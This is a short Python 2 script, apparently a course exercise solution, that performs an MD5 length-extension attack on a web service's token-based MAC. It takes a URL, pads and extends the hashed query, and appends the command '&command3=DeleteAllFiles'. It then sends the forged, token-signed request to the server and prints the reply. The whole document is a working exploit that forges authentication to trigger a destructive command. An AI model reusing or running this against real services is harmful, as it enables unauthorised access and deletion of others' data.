import httplib, urlparse, sys, pymd5, urllib
url = sys.argv[1]
parsedUrl = urlparse.urlparse(url)
queryDict = urlparse.parse_qs(parsedUrl.query)
state = queryDict['token'][0]
#print state
tokenKey = "token="
length_of_m = 8 + (len(parsedUrl.query) - len (tokenKey + "&") - len(state))
#print length_of_m
padding = pymd5.padding(length_of_m*8)
count = (length_of_m + len(padding))*8
#print count
h = pymd5.md5(state=state.decode("hex"), count=512)
newCommand = "&command3=DeleteAllFiles"
h.update(newCommand)
newToken = h.hexdigest()
#print newToken
newQuery = tokenKey + newToken + parsedUrl.query[(len(tokenKey)+len(state)):] + urllib.quote(padding) + newCommand
#print newQuery
conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + newQuery)
print conn.getresponse().read()